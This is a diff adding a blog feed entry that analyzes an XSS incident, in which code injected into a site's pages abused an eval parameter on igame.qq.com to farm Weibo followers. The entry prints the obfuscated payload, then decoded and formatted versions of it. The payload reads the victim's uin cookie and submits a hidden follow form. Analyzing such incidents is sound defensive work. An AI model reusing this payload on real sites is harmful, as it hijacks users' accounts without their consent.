@@ -4,7 +4,7 @@
   <title><![CDATA[分类：security | 移动开发技术]]></title>
   <link href="http://jason5.cn/blog/categories/security/atom.xml" rel="self"/>
   <link href="http://jason5.cn/"/>
-  <updated>2016-08-03T11:26:49+08:00</updated>
+  <updated>2016-08-03T11:50:09+08:00</updated>
   <id>http://jason5.cn/</id>
   <author>
     <name><![CDATA[jason]]></name>
@@ -12,6 +12,43 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[XSS应用-微博刷粉]]></title>
+    <link href="http://jason5.cn/blog/xssying-yong-wei-bo-shua-fen.html"/>
+    <updated>2016-08-03T11:34:13+08:00</updated>
+    <id>http://jason5.cn/blog/xssying-yong-wei-bo-shua-fen</id>
+    <content type="html"><![CDATA[<p>目前腾讯监控系统发现space.aili.com存在大量恶意的请求，通过igame.qq.com以期望达到刷微博粉丝的效果</p>
+
+<p>被插入代码截图如下（每个页面都有，应该是框架被修改）</p>
+
+<p><img src="http://jason5.cn/images/xss-weibo1.png" alt="" /></p>
+
+<p>被插入的恶意代码为：</p>
+
+<p><a href="http://igame.qq.com/popup/moodbox_share.htm?ADTAG=act.ttd.igameshare&amp;url=1&amp;call=eval">http://igame.qq.com/popup/moodbox_share.htm?ADTAG=act.ttd.igameshare&amp;url=1&amp;call=eval</a>(String.fromCharCode(40,102,117,110,99,116,105,111,110,40,41,123,119,105,110,100,111,119,46,117,61,34,99,104,117,110,120,105,95,108,117,34,59,119,105,110,100,111,119,46,109,109,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,100,105,118,34,41,59,119,105,110,100,111,119,46,109,109,46,105,110,110,101,114,72,84,77,76,61,34,60,105,102,114,97,109,101,32,115,116,121,108,101,61,39,100,105,115,112,108,97,121,58,110,111,110,101,39,32,110,97,109,101,61,39,109,106,39,62,60,47,105,102,114,97,109,101,62,60,102,111,114,109,32,109,101,116,104,111,100,61,39,80,79,83,84,39,32,105,100,61,39,109,105,39,32,97,99,116,105,111,110,61,39,104,116,116,112,58,47,47,114,97,100,105,111,46,116,46,113,113,46,99,111,109,47,109,105,110,105,47,102,111,108,108,111,119,46,112,104,112,39,32,116,97,114,103,101,116,61,39,109,106,39,62,60,105,110,112,117,116,32,116,121,112,101,61,39,104,105,100,100,101,110,39,32,118,97,108,117,101,61,39,34,43,119,105,110,100,111,119,46,117,43,34,39,32,110,97,109,101,61,39,117,39,47,62,60,105,110,112,117,116,32,116,121,112,101,61,39,104,105,100,100,101,110,39,32,118,97,108,117,101,61,39,34,43,40,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,46,109,97,116,99,104,40,47,40,63,58,94,124,92,115,41,117,105,110,61,111,40,92,100,43,41,47,41,124,124,91,34,34,44,34,34,93,41,91,49,93,124,48,41,43,34,39,32,110,97,109,101,61,39,117,105,110,39,47,62,60,47,102,111,114,109,62,34,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,119,105,110,100,111,119,46,109,109,41,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,34,109,105,34,41,46,115,117,98,109,105,116,40,41,59,125,41,40,41))</p>
+
+<p>解码后为:</p>
+
+<pre><code class="javascript">http://igame.qq.com/popup/moodbox_share.htm?ADTAG=act.ttd.igameshare&amp;url=1&amp;call=eval( (function(){window.u="chunxi_lu";window.mm=document.createElement("div");window.mm.innerHTML="&lt;iframe style='display:none' name='mj'&gt;&lt;/iframe&gt;&lt;form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'&gt;&lt;input type='hidden' value='"+window.u+"' name='u'/&gt;&lt;input type='hidden' value='"+((document.cookie.match(/(?:^|\s)uin=o(\d+)/)||["",""])[1]|0)+"' name='uin'/&gt;&lt;/form&gt;";document.body.appendChild(window.mm);document.getElementById("mi").submit();})()
+</code></pre>
+
+<p>格式化</p>
+
+<pre><code class="javascript">(function() {
+    window.u = "chunxi_lu";
+    window.mm = document.createElement("div");
+    window.mm.innerHTML = "&lt;iframe style='display:none' name='mj'&gt;&lt;/iframe&gt;&lt;form method='POST' id='mi' action='http://radio.t.qq.com/mini/follow.php' target='mj'&gt;&lt;input type='hidden' value='" + window.u + "' name='u'/&gt;&lt;input type='hidden' value='" + ((document.cookie.match(/(?:^|\s)uin=o(\d+)/) || ["", ""])[1] | 0) + "' name='uin'/&gt;&lt;/form&gt;";
+    document.body.appendChild(window.mm);
+    document.getElementById("mi").submit();
+})()
+</code></pre>
+
+<p>粉丝数刷到3w+</p>
+
+<p><img src="http://jason5.cn/images/xss-weibo2.png" alt="" /></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[DOM XSS]]></title>
